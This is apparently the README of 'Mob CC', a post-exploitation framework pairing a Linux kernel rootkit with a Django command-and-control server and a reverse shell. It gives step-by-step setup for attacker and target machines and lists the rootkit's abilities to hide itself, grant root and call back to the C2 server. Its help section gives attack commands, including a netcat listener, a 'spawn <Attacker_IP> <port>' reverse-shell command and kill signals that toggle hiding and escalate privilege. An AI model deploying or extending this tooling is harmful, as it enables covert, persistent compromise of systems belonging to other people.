# mobcc

Mob CC is a post-exploitation framework containing a Linux kernel rootkit, C2 server, and Reverse shell with network scanning capabilities.

---

## Setup:
## Attacking side:
  - Download and install Django in your attacking system. 'pip install Django'
  - Download the mobserver directory. You can delete the database file (i.e., db.sqlite3)
  - Change the directory to mobserver ( cd /path/to/mobserver/ ) and delete all migration directories from the app directory.

  ### Setup the database:
    python3 ./manage.py makemigrations
    python3 ./manage.py migrate

  ### Run server:
    python3 ./manage.py runserver <IP>:<port>

#### Note:
  - You can modify the IP address of the attacking machine.
  - If you wish to modify 'mob_client.py' you need to convert mob_client.py into a base64 string.
    `base64 mob_client.py`
  - Copy the base64 string and paste it in the place of the default string in 'mob.c'.
  
## Target Side:
  - Download the 'mob.c', 'make', and 'ftrace_helper.h' files and build the module using the make command (Make sure of the kernel version of the target system).  
  - Install the kernel module (mob.ko) using the insmod command. (This step should be done after the C&C server runs on the attacking machine)

  `sudo insmod mob.ko`

  - If everything is setup correctly (including the IP address) then after installing the rootkit you will get your target device name in the device list in home page.

---

## Usage:
  - Open the C&C server on your browser.
  - If you have already installed the rootkit on the target side then there will be your target device name in device list.
  - Select device and connect.
  - Send commands and recieve responses. You can check the help page for listed additional features.

---

## Linux Kernel Rootkit:
  - Use the Makefile to build the module.
  - ftracer_helper.h is a helping module trying to override the system calls. (Author: xcellerator)
  - Hide and Unhide themselves from modules lists.
  - Granting root permissions by updating root credentials.
  - Creating and executing the reverse shell/backdoor, which can be used to connect to a C2 server.

## Command & Control server:
  - Add new devices to the database by auto-collecting IP from the Https requests.
  - Connect to the target system via reverse shell/backdoor.
  - Send commands and receive responses from the target system via reverse shell.
  - Provide a list of every compromised system's commands and responses.
  - Handle requests from multiple compromised systems simultaneously.

## Reverse shell / Backdoor:
  - When executed, request the C2 server to add this device to the database.
  - Establish the connection between the C2 server and the target system.
  - Spawn a new reverse shell on demand for different IP addresses provided by the C2 server.
  - Scan the network and open ports for potential vulnerabilities in other connected systems.

---

# Screenshots:
  ## Home Page
  ![Home Page](/images/mobcc_home.png)

  ## Send Commands
  ![Send Commands](/images/connect_mob_client.png)

  ## Scan Network
  ![Scan Network](/images/scanning_network.png)

  ## Spawn Shell
  ![Spawn Shell](/images/spawn_newshell.png)

---

# Note:
  - Note that if you kill the reverse shell process, you must install the kernel rootkit module again into the target system.
  - No one can remove the module if it's hidden.

---

# Help:
  - To spawn a new shell from a different device. eg:'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'
  - To scan the internal network from the target system. 'scan'
  - To kill the connection (reverse shell process) type. 'kill -9 &lt;pid&gt;'
  - To toggle between hide and show the kernel module. 'kill -63 1'
  - To gain root privilege in the target machine from any other attacking machine using a reverse shell-like above. 'kill -64 1'

---
